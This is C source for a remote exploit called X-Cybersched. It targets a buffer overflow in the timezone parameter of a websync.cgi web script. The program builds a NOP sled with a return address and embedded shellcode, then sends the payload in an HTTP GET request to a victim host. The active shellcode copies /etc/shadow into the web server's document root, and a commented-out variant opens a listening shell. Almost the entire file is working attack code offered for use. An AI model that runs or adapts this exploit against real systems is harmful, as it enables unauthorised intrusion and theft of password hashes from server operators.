/* PRIVATE -- DO NOT DISTRIBUTE!!
  x-cybershed.c

  TimeZONE buffer overflow on cgi script rendering complete control of
the stack.

  Enrique A. Sanchez Montellano
  enrique.sanchez@defcom.com
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <fcntl.h>
#include <time.h>
#include <wait.h>
#include <errno.h>

#define OFFSET       0
#define ALIGN        0
#define BUFFER       264

/* Definicion de colores */

#define VERDE   "\E[32m"
#define BRILLOSO   "\E[1m"
#define NORMAL  "\E[m"
#define ROJO  "\E[31m"
#define CELESTE "\E[36m"
#define AZUL "\E[34m"
#define AMARILLO "\E[33m"
#define MORADO "\E[35m"

//passive port 0x8000 shell (written by agent0nd)
//static char Hellcode[]=
//"\xeb\x4b\x5f\x87\xfe\x29\xc0\x29\xdb\x40\x89\x46\x04\x40\x89\x06\xb0\x06\x89"
//"\x46\x08\xb0\x66\x43\x89\xf1\xcd\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x80"
//"\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x29\xc0\x89\x46\x10\xb0\x10\x89\x46"
//"\x08\xb0\x66\x43\xcd\x80\x29\xc0\x40\x89\x46\x04\xb3\x04\xb0\x66\xcd\x80\xeb"
//"\x02\xeb\x4c\x29\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\x43\xcd\x80\x88\xc3\x29"
//"\xc9\xb0\x3f\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\xb8\x2e\x62\x69"
//"\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46\x04\x29\xc0\x88\x46\x07\x89"
//"\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x29\xc0"
//"\x40\xcd\x80\xe8\x62\xff\xff\xff";

/* cp /etc/shadow /var/lib/httpd/htdocs */
static char Hellcode[]=
"\xeb\x3a\x5f\x31\xc0\x89\xfa\x89\x57\x64\x80\xc2\x36\x89\x57\x68\x80\xc2\x33\x80\xea\x30\x89\x57\x6c\x89\x47\x70\x88\x47\x25\x88\x4
7\x38\x88\x47\x62\xb0\x73\x2c\x53\x88\x47\x40\x88\x47\x4c\xb0\x6c\x2c\x61\x89\xfb\x8d\x4f\x64\x31\xd2\xcd\x80\xe8\xc1\xff\xff\xff\x2
f\x73\x62\x69\x6e\x2f\x2e\x2e\x2f\x73\x62\x69\x6e\x2f\x2e\x2e\x2f\x62\x69\x6e\x2f\x2e\x2e\x2f\x62\x69\x6e\x2f\x2e\x2e\x2f\x62\x69\x6
e\x2f\x73\x68XAGENT.OND.DEFCOM\x2d\x63\x58\x2f\x62\x69\x6e\x2f\x63\x70\x58\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x58\x2f\x76\x
61\x72\x2f\x6c\x69\x62\x2f\x68\x74\x74\x70\x64\x2f\x68\x74\x64\x6f\x63\x73";

unsigned long resolver (char *serv) {
  struct sockaddr_in sinn;
  struct hostent *hent;

  hent = gethostbyname (serv);
  bzero ((char *) &sinn, sizeof (sinn));
  memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length);
  return sinn.sin_addr.s_addr;

}

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

void usage(char *name) {
  printf("Usage:\n");
  printf("%s <victim> <offset> <align> <buffer> \n\n", name);
}

int connex(u_long victim) {
  int sockfd;
  struct sockaddr_in hostaddr;

  if((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
   perror("connex");
   exit(-1);
  }

  hostaddr.sin_port = htons(80);
  hostaddr.sin_addr.s_addr = victim;
  hostaddr.sin_family = AF_INET;

  if((connect(sockfd, (struct sockaddr *) &hostaddr, sizeof(hostaddr)))
< 0 ) {
   perror("connex");
   exit(-1);
  }

   return sockfd;
}

int ataque(int victim, char *command) {
  int sockfd, retval, i;
  char tmp[256];
  fd_set rfds;
  struct timeval timer;
  char part1[1024] =
"/cgi-bin/websync.cgi?ed=&Es=7x1x101&un=Defcom&hn=lab&rpt=/cybersched/En_US/WebResources&cbn=/cgi-bin/websync.cgi&dow=sun&dmy=Off&tf
h=Off&lan=En_US&ix=0&amd=2&epw=WXxiAkS&mrd=-1&mrc=0&mrb=0&bnv=9&ds=7x1x101&tzs=";
  char fancy[] = "Host: 127.0.0.1\nConnection: Keep-Alive\nUser-Agent:
Defcom Labs @ Spain version 0.1\nContent-type:
aplication/x-www-form-urlencoded\n";

  sockfd = connex(victim);

  FD_ZERO(&rfds);
  FD_SET(sockfd, &rfds);
  timer.tv_sec = 5;
  timer.tv_usec = 0;

  retval = select(sockfd + 1, NULL, &rfds, NULL, &timer);

  if(retval) {
   printf("%s[ + ] Atacking the server ... \n%s", VERDE, NORMAL);
   write(sockfd, "GET ", strlen("GET "));
   write(sockfd, part1, strlen(part1));
   write(sockfd, command, strlen(command));
   write(sockfd, "\n", strlen("\n"));
   // Fancy stuff ... LoL!
   write(sockfd, fancy, strlen(fancy));
   write(sockfd, "\n\n", strlen("\n\n"));
   for(i = 0; i < 256; i++) {
     tmp[i] = '\0';
   }
   read(sockfd, tmp, sizeof(tmp));
  }
  else {
   printf("%sTime out!!!!!\n%s", ROJO, NORMAL);
   exit(-1);
  }

}

int main(int argc, char **argv) {
  int offset = OFFSET;
  int align = ALIGN;
  int buffer = BUFFER;
  struct hostent *hent;
  char *command;
  unsigned long addr;
  int i, victim;

  if(argc < 2) {
   usage(argv[0]);
   exit(0);
  }

  if(argc > 2) offset = atoi(argv[2]);
  if(argc > 3) align = atoi(argv[3]);
  if(argc > 4) buffer = atoi(argv[4]);

  if((hent = gethostbyname(argv[1])) == NULL) {
   perror("x-cybersched");
   exit(1);
  }

  printf("%sX-Cybersched\n", AZUL);
  printf("------------------------------------\n");
  printf("Remote exploit .... by\n");
  printf("Enrique Sanchez (enrique.sanchez@defcom.com)\n%s", NORMAL);

#ifdef DEBUG
  printf("%s[ + DEBUG + ] Buffer is %d\n%s", AMARILLO,  buffer, NORMAL);
  printf("%s[ + DEBUG + ] The size of the shellcode is %d\n%s",
AMARILLO, strlen(Hellcode), NORMAL);
#endif

  addr = 0xbfffffff - offset;
  command = (char *)malloc(buffer);

  printf("%s[ + ] Using addres: 0x%x\n%s", VERDE, addr, NORMAL);

#ifdef DEBUG
  printf("%s[ + DEBUG + ] Command right now is: %s\n\n%s", AMARILLO,
command, NORMAL);
#endif

  printf("%s[ + ] Filling buffer for exploitation ... \n%s", VERDE, NORMAL);

  for(i = 0; i < buffer; i += 4) {
   *(long *)&command[i] = 0x90909090;
  }
  *(long *)&command[buffer - 4] = addr;

#ifdef DEBUG
  printf("%s[ + DEBUG + ] Command right now is: %s\n\n%s", AMARILLO,
command, NORMAL);
#endif

  memcpy(command + buffer - strlen(Hellcode) - 4, Hellcode,
strlen(Hellcode));

#ifdef DEBUG
  printf("%s[ + DEBUG + ] Command right now is: %s\n\n%s", AMARILLO,
command, NORMAL);
#endif

  ataque(resolver(argv[1]), command);

  return 0;
}
